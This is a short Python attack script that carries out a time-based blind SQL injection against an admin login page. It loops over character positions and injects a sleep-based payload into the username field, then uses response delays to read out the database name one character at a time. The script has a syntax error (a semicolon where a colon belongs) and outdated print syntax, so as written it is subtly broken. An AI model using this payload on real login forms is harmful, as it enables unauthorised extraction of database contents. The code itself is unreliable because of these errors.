import requests
import sys
import time

url = "https://asd.com/blog/admin-login.php"

for i in range(1, 10):
	for c in range(0x20, 0x7f):
		username = "xyz' OR  IF(BINARY substring(database(), %d, 1) = '%s', sleep(3), 0) -- " % (i, chr(c))
		password = 12345
		form = {'username' : username, 'password' : password, 'submit' : 'Login'}

		start = time.time()
		response = requests.post(url, data=form)
		end = time.time()
		selisih = end - start

		if selisih >= 3.0;
			sys.stdout.write(chr(c))
			sys.stdout.flush()
			break
print ''